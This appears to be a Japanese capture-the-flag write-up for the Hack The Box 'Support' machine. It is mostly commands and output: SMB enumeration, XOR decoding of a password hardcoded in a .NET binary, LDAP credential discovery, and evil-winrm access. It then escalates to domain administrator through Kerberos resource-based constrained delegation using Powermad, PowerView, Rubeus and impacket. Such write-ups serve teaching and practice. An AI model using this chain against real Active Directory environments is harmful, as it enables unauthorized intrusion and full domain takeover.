```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.11.174
...
Nmap scan report for 10.10.11.174
Host is up, received user-set (0.076s latency).
Scanned at 2022-10-04 12:59:22 JST for 402s
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-10-04 03:59:21Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
...
```
nmapの結果よりターゲット上でActive Directoryが動いてるとわかる。

ポート445が開いてるのでsmbシェアを調べると、見慣れないsupport-toolsなるフォルダがある。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ smbclient -L 10.10.11.174 

Password for [WORKGROUP\shoebill]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
  ```
  
 パスワード無しでsupport-toolsにアクセスして中身を確認する。
 
 ```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ smbclient //10.10.11.174/support-tools
Password for [WORKGROUP\shoebill]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul 21 02:01:06 2022
  ..                                  D        0  Sat May 28 20:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 20:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 20:19:55 2022
  putty.exe                           A  1273576  Sat May 28 20:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 20:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 02:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 20:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 20:19:43 2022
```

UserInfo.exe.zipがユーザ情報を得られそうなのでこれをダウンロードする。

```
smb: \> get UsreInfo.exe.zip
```
ダウンロード後、解凍してdnSpyで解析する。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174/support-tools]
└─$ unzip UserInfo.exe.zip
```
`UserInfo.exe`をdnSpyでみると暗号化されたパスワード、キー、そしてパスワードを生成する`getPassword()`関数が見つかる。

![dnspy](https://user-images.githubusercontent.com/85237728/194679210-75055544-fd20-497f-bbca-8caedabb954e.png)

XORは二回繰り返すと元に戻るので、このコードを参考にPythonスクリプトを書く。

```python
#!/usr/bin/env python3
from base64 import b64decode
from pwn import *

array = b64decode('0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E')
key = bytes('armando', 'utf-8')
ans = b''
for i in range(len(array)):
    temp = array[i] ^ key[i % len('armando')] ^ 223
    ans += pack(temp, 'all')

print('ans:', ans)
```
実行すると生のパスワードを得る。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ python3 decryptor.py
ans: b'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```
もう少しdnSpyの解析結果をみると、`LdapQuery()`というLdapについての関数が見つかる。

![ldapq](https://user-images.githubusercontent.com/85237728/194679714-8b0abf6c-6c51-40f4-8785-4845d4691776.png)

これにより"ldap"という名前のユーザいることがわかった。

ユーザ名ldap、パスワードnvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmzのcredentialを使って`ldapsearch`コマンドを実行する。

以下のように実行してUser情報を調べると、ユーザsupportの「info」の欄にパスワードらしき文字列を発見。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174/LdapSearch]
└─$ ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb'
...
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
...
```

ユーザ名support、パスワードIronside47pleasure40Watchfulで`evil-winrm`を実行したらユーザsupportのシェルがとれた。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ evil-winrm --ip 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
...
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
```

# Adminへの権限昇格

bloodhoundを使う。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -ns 10.10.11.174 -d support.htb -c all
```

上記コマンドにより20221009195127_XXXX.jsonという形式のjsonファイルが得られる。

bloodhoundを起動してこのjsonファイルたちをアップロードする。

すると、ユーザsupportが属しているShared Support Accountsグループは、dc.suuport.htbに対してGenericAllであることがわかる。

![alltodc](https://user-images.githubusercontent.com/85237728/194802089-b88b0c47-fef3-42cd-9661-a8e3b53be653.png)

## Kerberos Resource-based Constrained Delegation

![atkexp](https://user-images.githubusercontent.com/85237728/194802186-faf7b816-6b59-4335-822d-820c9a2d26ab.png)


bloodhoundのヘルプにしたがってコマンドを実行する。

```
*Evil-WinRM* PS C:\Users\support> . .\Powermad.ps1
*Evil-WinRM* PS C:\Users\support> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
[+] Machine account attackersystem added

*Evil-WinRM* PS C:\Users\support> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\support> $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

*Evil-WinRM* PS C:\Users\support> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
*Evil-WinRM* PS C:\Users\support> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support> $SD.GetBinaryForm($SDBytes, 0)

*Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

*Evil-WinRM* PS C:\Users\support> .\Rubeus.exe hash /password:Summer2018!

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Calculate Password Hash(es)

[*] Input password             : Summer2018!
[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F

Evil-WinRM* PS C:\Users\support> .\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:
cifs/dc.support.htb /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
...
[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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
[+] Ticket successfully imported!
```

このbase64表示のチケットをtempというファイル名でKali上保存する。

そしたら以下のようにaddmin.kirbiというファイル名で保存する。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ sed 's/^      //g' temp | tr -d '\n' | base64 -d > admin.kirbi
```

admin.kirbiをccacheファイルへ変換する。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ impacket-ticketConverter admin.kirbi admin.ccache
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
```
環境変数`KRB5CCNAME`にccacheファイルを設定する。
```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ export KRB5CCNAME=admin.ccache 
 ```
 最後に、impacketの`wmiexec`にて上で設定したチケットを使ってケルベロス認証すればAdminのシェルを得る。
 
 ```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ impacket-wmiexec -k -no-pass support.htb/administrator@dc.support.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
support\administrator
```

# 感想

やはり`ldapsearch`コマンドのenumが大切。ローカルの`bloodhound`や`ldapdomaindump`ではsupportのパスワードは得られなかった。

`ldapsearch`の結果をよく読んだり、dnSpyが解析したソースコードをよく読んで、何がおこなれているのか？やパスワード・ユーザ名を読み取るのが重要。
